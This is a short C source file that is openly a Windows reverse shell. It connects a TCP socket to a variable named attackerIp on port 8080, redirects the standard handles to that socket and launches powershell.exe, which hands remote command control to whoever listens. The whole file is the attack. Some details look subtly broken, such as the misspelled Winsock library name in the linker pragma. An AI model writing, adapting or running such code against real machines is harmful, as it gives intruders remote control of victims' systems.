#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "w2_32")

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;

int main(){
    char *attackerIp = "127.0.0.1";
    short attackerPort = 8080;

    WSAStartup(MAKEWORD(2, 2), &socketData);
    mainSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (GROUP) NULL, (DWORD) NULL);

    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_addr.S_un.S_addr = inet_addr(attackerIp);
    connectionAddress.sin_port = htons(attackerPort);

    WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);
    memset(&startupInfo, 0, sizeof(startupInfo));

    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdError = startupInfo.hStdOutput = startupInfo.hStdInput = mainSocket;

    CreateProcessW(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
    exit(0);
}
